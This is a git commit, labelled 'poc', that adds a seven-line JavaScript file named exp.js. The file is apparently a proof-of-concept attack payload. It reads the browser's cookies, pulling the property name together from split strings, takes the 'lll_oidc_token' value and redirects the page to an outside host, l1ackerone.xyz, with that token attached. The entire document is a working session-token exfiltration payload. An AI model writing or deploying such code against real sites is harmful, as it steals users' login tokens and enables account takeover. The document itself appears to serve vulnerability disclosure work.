39be327c6162e30ef825b44a9a5cd16b020dde27
itsryuku <39871872+itsryuku@users.noreply.github.com>
2024-12-20 16:28:25 -0500

    poc

---
+++ exp.js
@@ -0,0 +1,7 @@
+this.location.replace(
+    "https://l1ackerone.xyz/?token=" +
+        document["coo" + "kie"]
+            .split("; ")
+            .find((c) => c.startsWith("lll_oidc_token="))
+            ?.split("=")[1]
+);
